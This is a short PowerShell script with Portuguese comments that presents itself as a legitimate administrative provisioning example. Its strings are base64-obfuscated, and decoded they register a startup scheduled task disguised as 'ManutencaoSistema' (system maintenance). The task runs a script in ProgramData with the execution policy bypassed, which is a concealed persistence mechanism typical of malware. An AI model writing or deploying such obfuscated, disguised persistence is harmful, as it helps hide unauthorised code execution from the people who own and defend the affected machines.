# Exemplo de provisionamento de script administrativo legítimo
$O1FDDv = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TWFudXRlbmNhb1Npc3RlbWE=')))
$b3INv = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcUHJvZ3JhbURhdGFcU2NyaXB0c1xhbWlnby5wczE=')))

# Define a ação apontando diretamente para o interpretador e o arquivo
$BwHESwSG = New-ScheduledTaskAction -Execute ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbC5leGU='))) -Argument (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSA='))) + $b3INv)

# MODIFICADO: Define o gatilho para iniciar logo ao ligar/inicializar o PC
$RI8K89vY = New-ScheduledTaskTrigger -AtStartup

# Registra a tarefa no escopo do sistema
Register-ScheduledTask -TaskName $O1FDDv -Action $BwHESwSG -Trigger $RI8K89vY
